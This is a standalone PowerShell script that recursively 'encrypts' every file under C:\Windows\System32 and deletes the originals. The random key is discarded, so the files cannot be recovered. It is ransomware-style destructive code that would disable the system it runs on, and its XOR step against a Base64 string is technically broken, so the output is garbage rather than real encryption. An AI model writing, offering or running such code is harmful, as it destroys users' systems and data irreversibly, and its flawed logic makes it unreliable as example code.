# Encrypt files in System32 using a random key
$directory = "C:\Windows\System32"

# Generate a random encryption key
$key = [System.Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 }))

# Encrypt files in the directory and its subdirectories
Get-ChildItem -Path $directory -File -Recurse | ForEach-Object {
    $filePath = $_.FullName
    Write-Host "Encrypting file: $filePath"
    try {
        $encryptedFile = $filePath + ".encrypted"
        $encryptedFileBytes = Get-Content -Path $filePath -Encoding Byte
        $encryptedFileBytes | ForEach-Object {
            $_ -bxor $key
        } | Set-Content -Path $encryptedFile -Encoding Byte
        Remove-Item -Path $filePath
    } catch {
        Write-Host "Error encrypting file: $filePath"
    }
}

Write-Host "Encryption complete."
